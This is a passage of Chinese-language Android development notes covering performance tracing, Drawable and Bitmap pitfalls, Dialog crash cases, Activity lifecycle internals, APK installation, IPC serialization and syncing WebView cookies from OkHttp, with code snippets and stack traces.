Intergation和Youtube video display以及GCM等服务。这些全部集成在Google Cloud Platform上配置。 关于性能优化有一些建议： don’t do premature optimazition在你整天思考到底要用Enum还是IntDef的时候，你的网络库已经allocate了一大堆的垃圾。将精力集中在解决最严重的问题上。， 1. Systrace用于跟踪一段方法执行过程中的影响try { Trace.beginSection(TAG); // do stuff }finally { Trace.endSection(); } 计算一段方法到底花了多长时间，当然还是要在Android device monitor里面begin trace，注意要勾选Enable Application Traces from XXXX，选中自己的包名就好了。一开始可能不是特别好找，只要在html中ctrl+f找到了自己写的TAG，慢慢来应该能找到的。 2. FileObserverFileObserver可以监控设备上文件的更改，删除，读取。底层原理是使用了linux内核的inotify机制。但简书上有人说 android fileobserver 可以对文件系统的文件夹进行监听，但不能监听子目录。要监听子目录必须递归遍历所有的文件夹对其添加监听。fileobserver 在 Android 4.0 和 5.0 中是好用的，但在 Android 6.0 中有 bug 监听不能工作。 3. Environment.getXXX长什么样私有文件应该放在哪里，公开的文件适合放在哪里，tmp文件可以放在哪里。 Log.i(&quot;codecraeer&quot;, &quot;getFilesDir = &quot; + getFilesDir()); Log.i(&quot;codecraeer&quot;, &quot;getExternalFilesDir = &quot; + getExternalFilesDir(&quot;exter_test&quot;).getAbsolutePath()); Log.i(&quot;codecraeer&quot;, &quot;getDownloadCacheDirectory = &quot; + Environment.getDownloadCacheDirectory().getAbsolutePath()); Log.i(&quot;codecraeer&quot;, &quot;getDataDirectory = &quot; + Environment.getDataDirectory().getAbsolutePath()); Log.i(&quot;codecraeer&quot;, &quot;getExternalStorageDirectory = &quot; + Environment.getExternalStorageDirectory().getAbsolutePath()); Log.i(&quot;codecraeer&quot;, &quot;getExternalStoragePublicDirectory = &quot; + Environment.getExternalStoragePublicDirectory(&quot;pub_test&quot;)); 4.对象池(Object Pool)这个看一下Glide里面的BitmapPool就好了LruBitmapPool.javapool的大小是MemorySizeCalculator算出来的，考虑了App可以使用的最大内存和屏幕分辨率像素对应容量这两个因素。对象池主要关注put和get这两个方法。Glide中的LruBitmapPool.java中有一段很有意思的注释 @Override public synchronized Bitmap get(int width, int height, Bitmap.Config config) { Bitmap result = getDirty(width, height, config); if (result != null) { // Bitmaps in the pool contain random data that in some cases must be cleared for an image to be rendered // correctly. we shouldn&#39;t force all consumers to independently erase the contents individually, so we do so // here. See issue #131. result.eraseColor(Color.TRANSPARENT); } return result; } 就是说，从回收池里面取出来的Bitmap可能存储了一些脏数据，在复用之前要清除下旧数据。 另外，MotionEvent,Message,VelocityTracker以及Okio里面的Segment都是可以被recycle和obtain的可回收再利用对象。Andorid Bitmap后期支持了inBitmap，也是类似于回收再利用的概念。Bitmap有点不同，虽然内存中的表现形式只是二维byte数组。但在支持inBitmap之前，并不是每一个Bitmap都可以被直接回收用于存储下一个Bitmap. V4包里提供了简单的实现 5.MediaScanner是一个和有趣的可以扫描多媒体文件的类技术小黑屋 6. Drawable跟单例有点像官方文档上有这么一句，看起来很不起眼的Note: Each unique resource in your project can maintain only one state, no matter how many different objects you instantiate for it. For example, if you instantiate two Drawable objects from the same image resource and change a property (such as the alpha) for one object, then it also affects the other. When dealing with multiple instances of an image resource, instead of directly transforming the Drawable object you should perform a tween animation.这件事的意义在于，Drawable在整个Application中是单例。简单来说，getDrawable每次返回的都是一个新的Drawable，但Drawable只是一个Wrapper，放在res文件夹里的Drawable资源在整个Application中是单例。证明的方式很简单: 两个相同资源的Drawable可能不一样，但Drawable.getConstantState都是同一个instance。原理的话，参考 Cyril Mottier在2013年的演讲就跟xml是binary optimized的一样，亲测，在一个Activity中改变Drawable的Alpha属性，退出重新进，Drawable的Alpha就已经是被更改了的。在另一个Activity中引用这个Drawable，Alpha也受到影响。更严重的是，在一个Activity中使用((BitmapDrawable)getDrawable).getBitmap().recycle()，在另一个Activity中使用这个Drawable，直接报错： java.lang.RuntimeException: Canvas: trying to use a recycled bitmap android.graphics.Bitmap@c08bbc6 at android.graphics.Canvas.throwIfCannotDraw(Canvas.java:1270) at android.graphics.Canvas.drawBitmap(Canvas.java:1404) at android.graphics.drawable.BitmapDrawable.draw(BitmapDrawable.java:544) at android.widget.ImageView.onDraw(ImageView.java:1228) 这种东西根本防不胜防。stackOverFlow上也有讨论被人为调用Bitmap.recycle()的res中的图片资源直接不能用了，怎么办，重新用BitmapFactory去decode或者创建一张Canvas，用原来的bitmap去画呗。照说Android 3.0之后就不应该调用Recycle方法了，记得Chet Haase说过，Recycle doesn’t do anything。另外一种说法是，bitmap.isMutable()返回是false的话(从res加载的)就不该去mutate。真要更改像素属性的话，可以创建一个Canvas，然后用原来的bitmap去画一个一样大的，或者用bitmap.copy方法创建一个新的。 7. Aidl里面有些关键字oneway关键字。AIDL 接口的实现必须是完全线程安全实现。 oneway 关键字用于修改远程调用的行为。使用该关键字时，远程调用不会阻塞；它只是发送事务数据并立即返回 8. 自定义View一个不容易发现的点自定义View的套路一般是这样的 public CustomTitleView(Context context, AttributeSet attrs) { { this(context, attrs, 0); } public CustomTitleView(Context context) { this(context, null); } public CustomTitleView(Context context, AttributeSet attrs, int defStyle) { super(context, attrs, defStyle); // 获得我们所定义的自定义样式属性 init(); } } 然后在layout里面去findViewById，妥妥的找不到。写在xml里面，会调到两个参数的构造函数，因为id这种东西写是在xml里面的，所以在两个参数的构造函数里面做事情就好了。 9. Dialog会出的一些错误9.1. showDialog之前最好判断下,activity.isFinishing否则会崩成这样： E/AndroidRuntime: FATAL EXCEPTION: main Process: com.xxx.xxx, PID: 30025 android.view.WindowManager$BadTokenException: Unable to add window -- token android.os.BinderProxy@59d55fe is not valid; is your activity running? at android.view.ViewRootImpl.setView(ViewRootImpl.java:579) at android.view.WindowManagerGlobal.addView(WindowManagerGlobal.java:310) at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:91) at android.app.Dialog.show(Dialog.java:319) ... 9.2. show一个Dialog，忘记关掉就finish，App不会崩，但日志里面有error：从用户角度来看，Dialog随着页面的关闭也关了 E/WindowManager: android.view.WindowLeaked: Activity com.example.SomeActivity has leaked window com.android.internal.policy.PhoneWindow$DecorView at android.view.ViewRootImpl.&lt;init&gt;(ViewRootImpl.java:380) at android.view.WindowManagerGlobal.addView(WindowManagerGlobal.java:299) at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:91) at android.app.Dialog.show(Dialog.java:319) ... 对比一下上面那个error，目测只有FATAL EXCEPTION才会导致App崩溃 9.3. activity finish掉之后再去Dismiss，先出2的日志，然后是一个fatal exception button.setOnClickListener { v -&gt; showDialog() finish() // onBackPressed也一样 v.postDelayed( Runnable { mDialg!!.dismiss() },2000) } //第一个是这个 E/WindowManager: android.view.WindowLeaked: Activity com.xxx.DialogActivity has leaked window com.android.internal.policy.PhoneWindow$DecorView{240a531 V //2秒之后出现这个 E/AndroidRuntime: FATAL EXCEPTION: main Process: com.harris.simplezhihu, PID: 7256 java.lang.IllegalArgumentException: View=com.android.internal.policy.PhoneWindow$DecorView{240a531 V.E...... R......D 0,0-1026,716} not attached to window manager at android.view.WindowManagerGlobal.findViewLocked(WindowManagerGlobal.java:424) at android.view.WindowManagerGlobal.removeView(WindowManagerGlobal.java:350) at android.view.WindowManagerImpl.removeViewImmediate(WindowManagerImpl.java:123) at android.app.Dialog.dismissDialog(Dialog.java:362) 就崩了，dismiss之前先判断下isFinishing就没事了 9.4. dialog.show不是异步方法 showDialog() finish() App不会崩，和2一样的error日志,看来不是Fatal瞅一眼源码Dialog.java: public void show() { // ....... mWindowManager.addView(mDecor, l); mShowing = true; sendShowMessage();//发个消息给，OnShowListener } private void sendShowMessage() { if (mShowMessage != null) { // Obtain a new message so this dialog can be re-used Message.obtain(mShowMessage).sendToTarget(); //sendToTarget是到主线程的MessageQueue去排队了 } } 所以ui上显示出Dialog和onShow不是一前一后(在同一个消息里面)调用的。 private static final class ListenersHandler extends Handler { private final WeakReference&lt;DialogInterface&gt; mDialog; public ListenersHandler(Dialog dialog) { mDialog = new WeakReference&lt;&gt;(dialog); } @Override public void handleMessage(Message msg) { switch (msg.what) { case DISMISS: ((OnDismissListener) msg.obj).onDismiss(mDialog.get()); break; case CANCEL: ((OnCancelListener) msg.obj).onCancel(mDialog.get()); break; case SHOW: ((OnShowListener) msg.obj).onShow(mDialog.get()); break; } } } 很容易想到onDismiss(Dialog)里面的dialog可能为null，(主线程恰好在排队，正好来一次GC)，可能性应该不大。 9.5. Dialog中有一个OnKeyListener，所以用户手动按返回键会去dismissDialog并消费掉事件，代码调用onBackPressed和手动按返回键是不一样的。 10. RecyclerView的ItemAnimator有很多方法可以overrideChet的Demo 11. 一些点 图片缓存策略 Rxjava如何管理生命周期 Okio源码 OkHttp中和WebView中Cookie是怎么处理的 Android上Socket的使用 注解 Android上的进程通信，共享内存问题 Webp格式 UI widget检查Thread是在ViewRootImpl里面有一段方法checkThread() 。 12. No Activity found to handle Intent { act=com.android.camera.action.CROPcom.android.camera.action.CROP并不是一个AOSP官方规定的Intent，有些设备上是会报错的。这个链接的作者是Mark Murphy，很有趣的一个人。stackOverFlow上也有讨论解决办法就是加一个catch(ActivityNotFoundException)就好了 13. Dalvik和Art崩的时候堆栈是不一样的//Dalvik是这么崩的 at android.view.View.performClick(View.java:4438) at android.view.View$PerformClick.run(View.java:18439) at android.os.Handler.handleCallback(Handler.java:733) at android.os.Handler.dispatchMessage(Handler.java:95) at android.os.Looper.loop(Looper.java:136) at android.app.ActivityThread.main(ActivityThread.java:5095) at java.lang.reflect.Method.invokeNative(Method.java) at java.lang.reflect.Method.invoke(Method.java:515) at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786) at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:602) at dalvik.system.NativeStart.main(NativeStart.java) //art是这么崩的 at android.app.Activity.performStart(Activity.java:6311) at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2387) at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2484) at android.app.ActivityThread.access$900(ActivityThread.java:158) at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1352) at android.os.Handler.dispatchMessage(Handler.java:102) at android.os.Looper.loop(Looper.java:171) at android.app.ActivityThread.main(ActivityThread.java:5454) at java.lang.reflect.Method.invoke(Method.java) at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:726) at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:616) 14. 理解Canvas,surface,window等概念Dianne Hackborn的回答onDraw里面的canvas是lock surface得到的 15.如果想要用一个动画移动一个View的话，没必要animate更改LayoutParams更改LayoutParams看上去是现实生活中应该做的，但其实只需要用setTranslationX或者setTranslationY就好了。如果动画的每一帧都去更改layoutParams（会requestLayout，非常慢）,正确的做法是在视觉上做到正确的，animate TranslationX，这些是postLayout params，等动画结束后再把应有的layout属性设置上去。这样动画会更加流畅。 —- Android for Java Developers(Big Android BBQ 2015) – Chet Haase 16. tint跑在GPU上，background会invalidate整个Drawable如果想要动画渐变一个View的Background的话,animate tint即可，性能更好 17. SpringAnimation(具有弹性的动画)Facebook早在15年就推出了具有弹性的动画,谷歌在16年给supportLib添加了Spring Animation，都是相似的理念。弹性动画的关键是在keyFrame处算出非线性的值，用于设定UI控件展示状态。 18. Choreographer可以添加callbackdoFrame方法的参数是(long FrameTimeNanos)，这个时间需要除以1000 1000测试了一下，Frame确实是16毫秒更新一次，也就是接收到VSYNC信号的时机。其实简单的想一下，这样可以用来显示当前应用的帧率，16ms就是60FPS,20ms就是50FPS.论那些跑分软件是怎么做出来的。。。。当然更专业的方式应该是这个命令 adb shell dumpsys SurfaceFlinger –latency + 网上有人写了python脚本，看起来更加直观一点 19. 网络请求的Batch网络较差的情况下，可以将Request cache下来，等到网络较好的时候再执行。Jesse Wilson推荐使用TAPE有两种实现，基于文件系统的和基于内存的。基于内存的很简单，基于文件的能够在crash发生时自动回退。 20.getSystemService是存在memory leak问题的context.getSystemService源码分析到最后，是从一个Hashmap里面取出Serviceactivity.getSystemService -&gt; ContextImpl.getSystemService -&gt; SystemServiceRegistry.getSystemService(SystemServiceRegistry里面有个HashMap&lt;String, ServiceFetcher&lt;?&gt;&gt;)WifiManager存在leak的issue 21. PopupWindow在7.0和7.1上是存在问题的参考解决方式 if (Build.VERSION.SDK_INT &lt; 24) { popupWindow.showAsDropDown(button); } else { int[] location = new int[2]; // 获取控件在屏幕的位置 button.getLocationOnScreen(location); if (Build.VERSION.SDK_INT == 25) { int tempheight = popupWindow.getHeight(); if (tempheight == WindowManager.LayoutParams.MATCH_PARENT || screenHeight &lt;= tempheight) { popupWindow.setHeight(screenHeight - location[1] - button.getHeight()); } } popupWindow.showAtLocation(button, Gravity.NO_GRAVITY, location[0], location[1] + button.getHeight()); } 22. onSaveInstance的调用顺序以及ActivityThread的一些点onSaveInstance在HoneyComb之前会在onPause前调用，HoneyComb开始，会在onStop前调用3.0之前的基本不用看了，目前在Android 25 sdk中ActivityThread.performStopActivityInner if (!r.activity.mFinished &amp;&amp; saveState) { if (r.state == null) { callCallActivityOnSaveInstanceState(r); } } try { // Now we are idle. r.activity.performStop(false /*preserveWindow*/); } catch (Exception e) { if (!mInstrumentation.onException(r.activity, e)) { throw new RuntimeException( &quot;Unable to stop activity &quot; + r.intent.getComponent().toShortString() + &quot;: &quot; + e.toString(), e); } } 其实Activity的所有onXXX都是由ActivityThread发起的，其实主函数也在这里。那么开始吧ActivityThread.handleLaunchActivity private void handleLaunchActivity(ActivityClientRecord r, Intent customIntent, String reason){ // ................... Activity a = performLaunchActivity(r, customIntent); //&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; if (a != null) { handleResumeActivity(r.token, false, r.isForward, !r.activity.mFinished &amp;&amp; !r.startsNotResumed, r.lastProcessedSeq, reason); } //&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; } private Activity performLaunchActivity(ActivityClientRecord r, Intent customIntent){ // ............ activity = mInstrumentation.newActivity( cl, component.getClassName(), r.intent); //Activity实例就是在这里面反射创建出来的 if (activity != null) { //...... mInstrumentation.callActivityOnCreate(activity, r.state); /// onCreate if (!r.activity.mFinished) { //经常会有人在onCreate里面finish activity.performStart(); // onStart r.stopped = false; } } } 所以总的顺序是ActivityThread#handleLaunchActivity -&gt;ActivityThread#performLaunchActivity -&gt;反射创建Activity实例 -&gt;mInstrumentation.callActivityOnCreate -&gt;activity.performStart() -&gt;handleResumeActivity()以上都是在一个Message里面做的这个Message的what是“LAUNCH_ACTIVITY =100”，这个Message是基本的尿性是 handleXXX -&gt; performXXX另外,onActivityResult是在ActivityThread的deliverResults里面触发的 23. 编译出错 duplicate files copied in apk lib/x86/libRoadLineRebuildAPI.so 集成高德地图的时候 在app的build.gradle中添加 packagingOptions { pickFirst &#39;lib/**.so&#39; } 24. Could not resolve com.android.support:appcompat-v7:26.1.0Android Studio里面设置httpProxy要生效其实得看gradle.properities文件里面这几行 systemProp.http.proxyPort=1080 systemProp.http.proxyHost=127.0.0.1 systemProp.https.proxyPort=1080 systemProp.https.proxyHost=127.0.0.1 注意，maven(),google()这些库都是https的，所以得把https也勾上。 25. 执行gradlew命令多了之后c盘占用空间越来越小执行gradlew命令，会根据gradlew-wrapper.properities中设置的distributionUrl去下载对应的gradle-4.1-all.zip，然后unzip到 C://Users//username//.gradle//wrapper//dists 这个目录。所以切换到这个目录，可以把之前2.x,3.x的全部都删掉了，看了下大小，将近3个GB。还有每个Android项目的根目录下都有一个.gradle文件夹。按照linux文件系统的传统，前面加上一个点的意思都是隐藏文件。点进去看，里面的东西删除也没问题。 26. 在 AndroidStudio 工程点击 Run 按钮， 实际上做了什么操作呢？知乎的回答看下日志就很清晰了 17:35:33 Executing tasks: [:app:assembleDebug] 17:35:34 Gradle build finished in 858ms 03/06 15:50:39: Launching app $ adb push F:\\workspace\\clones\\AndroidRepo\\app\\build\\outputs\\apk\\debug\\app-debug.apk /data/local/tmp/com.me.harris.myapplication $ adb shell pm install -t -r &quot;/data/local/tmp/com.me.harris.myapplication&quot; Success $ adb shell am start -n &quot;com.me.harris.myapplication/com.me.harris.myapplication.MainActivity&quot; -a android.intent.action.MAIN -c android.intent.category.LAUNCHER Client not ready yet..Waiting for process to come online Waiting for process to come online Connected to process 16409 on device vivo-vivo_x9-a9c690fb Success $ adb shell am start -n &quot;com.didi.virtualapk/com.didi.virtualapk.MainActivity&quot; -a android.intent.action.MAIN -c android.intent.category.LAUNCHER Client not ready yet..Waiting for process to come online Connected to process 21777 on device samsung-sm_g9500-98895a473737504e42 简单来说就是gradle installDebug Android Stuido点击build按钮做了什么Configure Your Build 27. 多进程场景下Application的onCreate是会被多次调用的在Application的onCreate中添加日志 //正常的Application起来都是1 Log.e(&quot;current-process-id is &quot;+android.os.Process.myPid()); // 1 Log.e(&quot;current-thread-id is &quot;+Thread.currentThread().getId()); // 1 //在应用内点击按钮起一个process，application的onCreate又被执行了一次 Log.e(&quot;current-process-id is &quot;+android.os.Process.myPid()); // 12055 Log.e(&quot;current-thread-id is &quot;+Thread.currentThread().getId()); // 1 //这时候看下当前系统中跑的所有进程，这个12055的进程就在这里面 ActivityManager mActivityManager = (ActivityManager)this.getSystemService(getApplicationContext().ACTIVITY_SERVICE); for (ActivityManager.RunningAppProcessInfo appProcess : mActivityManager.getRunningAppProcesses()) { if (appProcess.pid == pid) { processNameString = appProcess.processName; } } 至于原因的话，ActivityThread的handleCreateService方法中有这么一句： Application app = packageInfo.makeApplication(false, mInstrumentation);但是这个不会把MainActivity重新创建一个。 至于为什么要用多进程，微信Android客户端后台保活经验分享这篇文章中提到了微信至少用了三个进程，这篇文章还提到Shadowsocks-Android就开了个进程跑C程序来维护代理。记得系统给每个Application分配的内存总量不那么多，可以通过 Runtime runtime = Runtime.getRuntime(); LogUtil.w(TAG, String.valueOf(toMB(runtime.freeMemory()))); // 5.79MB LogUtil.w(TAG, String.valueOf(toMB(runtime.totalMemory()))); //14.13MB private String toMB(long number) { return String.format(&quot;%.2f&quot;, number / 1024.0 / 1024.0); } 大概也就几十个MB的样子，确实不是很多。多进程下，等于平白多了几十MB的内存，对于缓解性能压力还是有好处的。 大概什么时候就应该开一个多进程呢子进程挂了，主进程照样能跑，亲测会出现这样的log JavaBinder: * Uncaught remote exception! (Exceptions are not yet supported across processes.) 28. 关于Android APK 安装过程以下内容来自Android APK 安装过程详解首先APK 的本质是一个 Zip 压缩包，只是后缀被修改为 apk，其中打包了源代码编译出的 class.dex、一些图片视频资源文件和一些 Native 库文件。APK 文件与 Zip 文件最大的一个不同是 APK 包含签名信息，用于保证安装包安全不被修改。 ODEX 文件是 Dalvik 将 DEX 文件中可执行文件——class.dex——文件解压出来后，存储在本地后生成的。因为 Android 系统无法直接运行 APK 文件，需要将其解压后找到 class.dex 文件后才可以运行，因此在安装时就将其取出放在本地，可以提高应用启动速度。除了这个原因，其实在将 class.dex 转换成 ODEX 文件过程中，还根据当前系统进行了优化（直接复制到其他系统不一定可以运行），文件大小会减少，ODEX 文件比 DEX 文件更难反编译，这也在一定程度上提高了安全性，因此在一些系统预装或系统级应用大多采用了 ODEX 优化。一般 ODEX 不直接运行，在 Dalvik 运行 ODEX 时，需要通过 JIT 进行优化，提高运行效率。JIT 是一种在运行时同步将字节码转化成机器码的过程，Dalvik 直接运行转化后的机器码，这会导致部分的内存和时间开销，但是整体来说，在某些情况下是会提高系统性能的。（有些动态编译器，可能根据经验或尝试编译，优化这一过程，可能运行次数越多，优化效果越好）OAT 文件是 ART 运行的文件，是一种二进制可运行文件，包含 DEX 文件和编译出的本地机器指令文件，其文件格式类似于网络数据报文，包含文件头和文件体，文件头的 oatdata、oatexec 和 oatlastword 字段分别描述 DEX 文件位置和本地机器指令的起止位置。因为 OAT 文件包含 DEX 文件，因此比 ODEX 文件占用空间更大，由于其在安装时经过了 ART 的处理，ART 加载 OAT 文件后不需要经过处理就可以直接运行，它没有了从字节码装换成机器码的过程，因此运行速度更快。可以理解为 JIT 从运行时才解析提前到了安装时解析，安装变慢，运行变快。 再仔细一点挖掘的话，找到这样一篇文章 private boolean connect() { if (mSocket != null) { return true; } Slog.i(TAG, &quot;connecting...&quot;); try { mSocket = new LocalSocket(); LocalSocketAddress address = new LocalSocketAddress(&quot;installd&quot;, LocalSocketAddress.Namespace.RESERVED); mSocket.connect(address); mIn = mSocket.getInputStream(); mOut = mSocket.getOutputStream(); } catch (IOException ex) { disconnect(); return false; } return true; } 显然是通过socket通信的，应用程序的安装与卸载并非PackageManagerService来完成，而是通过PackageManagerService来访问installd服务来执行程序包的安装与卸载的。 installd是通过init.rc在系统启动时就开始运行的服务，installd进程是用c写的，这里面也是写了一个循环在跑的server: for (;;) { s = accept(lsocket, &amp;addr, &amp;alen); } 29.Android的动画分为Animation和Animator实现android 动画原理.ObjectAnimator和ValueAnimator这些东西要记得在页面销毁的时候去cancel或者end。end会通知一声onAnimationUpdate，cancel不会。所以不要在onAnimationUpdate里面调用end -&gt; onAnimationUpdate里面调用end -&gt; onAnimationUpdate里面调用end -&gt; onA…. Fatal Exception: java.lang.StackOverflowErrorat android.animation.ValueAnimator.getOrCreateAnimationHandler(ValueAnimator.java:1332) 30. 在api24之前，WifiManager存在leak On versions prior to Android N (24), initializing the WifiManager via Context#getSystemService can cause a memory leak if the context is not the application context 31. Android手机显示的电量是从哪读取的？batterystats.bin不是用来做电池校正的。2012年1月13日，DianneHackborn在G+上给出了答案： Today&#39;s myth debunking: &quot;The battery indicator in the status/notification bar is a reflection of the batterystats.bin file in the data/system/ directory.&quot; No, it does not. 这个文件只是用来显示“设置”里面App耗电量的,across reboot。深入浅出Android App耗电量统计这篇文章指出，实际读取的文件位置由OEM厂商决定，官方文档 device///frameworks/base/core/res/res/xml/power_profile.xml 这个文件 其实这一段adb命令就可以了 adb shell dumpsys batterystats 32. 多进程SharedPreference读写使用ContentProvider就好了public abstract SharedPreferences getSharedPreferences(String name, @PreferencesMode int mode); //默认传进来的是MODE_PRIVATE， // MODE_MULTI_PROCESS 其实不能保证 所以一般的做法是利用ContentProvider去IPC。 getContentResolver().getType() //客户端发起请求 provider的getType方法中返回对应的String，一次IPC来回 打断点发现provider进程会走到execTransact -&gt; onTransact -&gt; query方法。这期间client被挂起，远程方法返回之后client方法继续执行。客户端发送请求后，会被挂起，所以如果长时间不返回，当前线程会一直阻塞，所以要在子线程发送异步请求。写contentProvider的套路基本就是 public static final String AUTHORITY = &quot;com.me.book.provider&quot;; // 与AndroidManifest保持一致 public static final Uri BOOK_CONTENT_URI = Uri.parse(&quot;content://&quot; + AUTHORITY + &quot;/book&quot;); public static final Uri USER_CONTENT_URI = Uri.parse(&quot;content://&quot; + AUTHORITY + &quot;/user&quot;); 数据库的位置是放在/data/data/com.packagename.applicationName/databases里/data/data/com.packagename.applicationName/这个文件夹里一共四个文件夹，cache, code_cache(dex), files,databases 好像7.0之后sharedPreference的存储的位置挪到了“/data/data/应用程序包/shared_prefs”这里 33. Activity的生命周期一直是一个很重要的话题A start B forResult , B回来之后A被系统干掉了怎么办？回来的时候A已经不是原来的A，所以要在onSaveInstance和onRestoreInstance中维护数据 34. 集成微信登录，微信如何和App通信的？WXEntryActivity一般是这样的: public class WXEntryActivity extends Activity implements IWXAPIEventHandler { private IWXAPI api; @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); api = WXAPIFactory.createWXAPI(this, mWXAppKey); api.handleIntent(getIntent(), this); } @Override public void onResp(BaseResp resp) { switch (resp.errCode) { case BaseResp.ErrCode.ERR_OK: break; } } } // api.handleIntent(getIntent(), this); 这里面的实现如下： public final boolean handleIntent(Intent var1, IWXAPIEventHandler var2) { try { int var16 = var1.getIntExtra(&quot;_wxapi_command_type&quot;, 0); //这里其实已经跑在当前App的进程了 switch(var16) { case 1: Resp var23 = new Resp(var1.getExtras()); var2.onResp(var23); // 直接调用WXEntryActivity中的onResp方法 return true; case 2: com.tencent.mm.opensdk.modelmsg.SendMessageToWX.Resp var22 = new com.tencent.mm.opensdk.modelmsg.SendMessageToWX.Resp(var1.getExtras()); var2.onResp(var22); return true; // ...... } } } 再结合xml中的exported = true ; &lt;activity android:name=&quot;.wxapi.WXEntryActivity&quot; android:exported=&quot;true&quot; android:launchMode=&quot;singleTop&quot; android:theme=&quot;@android:style/Theme.Translucent&quot; /&gt; 猜测是通过Intent直接设置component发送请求，传递数据，很正规的实现 35. 多进程虚拟机都是单独的Android为每个应用都分配了一个独立的虚拟机(VM)，确切说是为每个进程都分配了一个独立的虚拟机，不同的虚拟机在内存分配上有不同的地址空间，这样在不同的虚拟机(即进程)中访问同一个类的对象时就会产生多份副本，而这些副本之间也是相互独立，互不影响的。 36. Parcelable 与 Serializable 区别Serializable的设计初衷是为了序列化对象到本地文件、数据库、网络流、RMI以便数据传输，当然这种传输可以是程序内的也可以是两个程序间的。而Android的Parcelable的设计初衷是由于Serializable效率过低，消耗大，而android中数据传递主要是在内存环境中（内存属于android中的稀有资源），因此Parcelable的出现为了满足数据在内存中低开销而且高效地传递问题。Parcelable的性能比Serializable好，在内存开销方面较小，所以Android应用程序在内存间数据传输时推荐使用Parcelable，如activity间传输数据和AIDL数据传递，而Serializable将数据持久化的操作方便，因此在将对象序列化到存储设置中或将对象序列化后通过网络传输时建议选择Serializable（Parcelable也是可以，只不过实现和操作过程过于麻烦并且为了防止android版本不同而导致Parcelable可能不同的情况，因此在序列化到存储设备或者网络传输方面还是尽量选择Serializable接口）。 无论是Parcelable还是Serializable，执行反序列操作后的对象都是新创建的，与原来的对象并不相同，只不过内容一样罢了。详细介绍Android中Parcelable的原理和使用方法Parcelable基本上是将对象映射成一个Parcel对象，提供了两者之间转换的函数，Parcel对象可以被写进共享内存。跨进程直接使用。Serializable在恢复一个Object的时候是去使用ObjecInputStream的readObject方法，这里面调用了newInstance方法，反射，性能当然会差一点。 3.Parcelable与Serializable的性能比较首先Parcelable的性能要强于Serializable的原因我需要简单的阐述一下 1）. 在内存的使用中,前者在性能方面要强于后者 2）. 后者在序列化操作的时候会产生大量的临时变量,(原因是使用了反射机制)从而导致GC的频繁调用,因此在性能上会稍微逊色 3）. Parcelable是以Ibinder作为信息载体的.在内存上的开销比较小,因此在内存之间进行数据传递的时候,Android推荐使用Parcelable,既然是内存方面比价有优势,那么自然就要优先选择. 4）. 在读写数据的时候,Parcelable是在内存中直接进行读写,而Serializable是通过使用IO流的形式将数据读写入在硬盘上. 但是：虽然Parcelable的性能要强于Serializable,但是仍然有特殊的情况需要使用Serializable,而不去使用Parcelable,因为Parcelable无法将数据进行持久化,因此在将数据保存在磁盘的时候,仍然需要使用后者,因为前者无法很好的将数据进行持久化.(原因是在不同的Android版本当中,Parcelable可能会不同,因此数据的持久化方面仍然是使用Serializable) 37.WebView的statusCode的获取来自stackoverFlow @TargetApi(Build.VERSION_CODES.M) @Override public void onReceivedError(WebView view, WebResourceRequest req, WebResourceError rerr) { onReceivedError(view, rerr.getErrorCode(), rerr.getDescription().toString(), req.getUrl().toString()); } @SuppressWarnings(&quot;deprecation&quot;) public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) { if (errorCode == -14) // -14 is error for file not found, like 404. view.loadUrl(&quot;http://youriphost&quot;); } 38 .WebView的Cookie问题List&lt;Cookie&gt; mCookies; mOkHttpClient = new OkHttpClient.Builder() ... // 下面就是对OkHttp的cookie的处理 .cookieJar(new CookieJar() { // 对服务器返回的cookie的处理的方法 // 参数url和cookie就是cookie对应的url和cookie的值 @Override public void saveFromResponse(HttpUrl url, List&lt;Cookie&gt; cookies) { // 对cookie的处理，一般是存到内存中，使其他地方可以获得 mCookies = cookies; } // 发送请求时的cookie的处理，返回的List&lt;Cookie&gt;即请求的cookie @Override public List&lt;Cookie&gt; loadForRequest(HttpUrl url) { return mCookies; //return null; } }) .build(); //从okHttp那边拿到cookie之后 private void syncCookies(String url, List&lt;Cookie&gt; cookies) { // 一些前提设置 CookieSyncManager.createInstance(this); final CookieManager cookieManager = CookieManager.getInstance(); cookieManager.setAcceptCookie(true); /** * 设置webView支持JS的Cookie的调用，5.0以上才要设置 */ if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) { cookieManager.setAcceptThirdPartyCookies(mWebView, true); } //cookieManager.removeAllCookie(); // 向WebView中添加Cookie， for (Cookie cookie : cookies) { cookieManager.setCookie(url, cookie.toString()); } // 刷新，同步 if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP_MR1) { CookieManager.getInstance().flush(); } CookieSyncManager.getInstance().sync(); //String newCookie = cookieManager.getCookie(url);验证是否将cookie同步进去 //KLog.i(&quot;newCookie: &quot; + newCookie); } //但是顺序很重要 // 1.先初始化WebView，各种设置setting，webViewClient和chromeClient等 initWebView(); // 2.再获得，并同步cookie // MyCookieJar.getInstance().getCookies()可以换成ApiManager.getInstance().getCookies()等 syncCookies(url, MyCookieJar.getInstance().getCookies()); // 3.最后加载url mWebView.loadUrl(url); cookie带不过去的解决问题：Native已经登录，cookie可以设置进去，但是网页进行了复杂的ajax操作（我也不知道什么操作），cookie带不过去，到指定页面还得登录。5.0以下正常解决：经过排查，发现高版本时问题出在ajax跳转时，是Js对Cookie的操作，不经过WebView，正常的WebView设置没有作用。看了很多博客，还是在StackOverFlow上发现解决方法。一行代码 final CookieManager cookieManager = CookieManager.getInstance(); cookieManager.setAcceptCookie(true); /** * 设置webView支持JS的Cookie的调用，5.0以上才要设置 */ // 大致意思：mWebView接收第三方对Cookie的操作，也就是支持Js对cookie的操作 cookieManager.setAcceptThirdPartyCookies(mWebView, 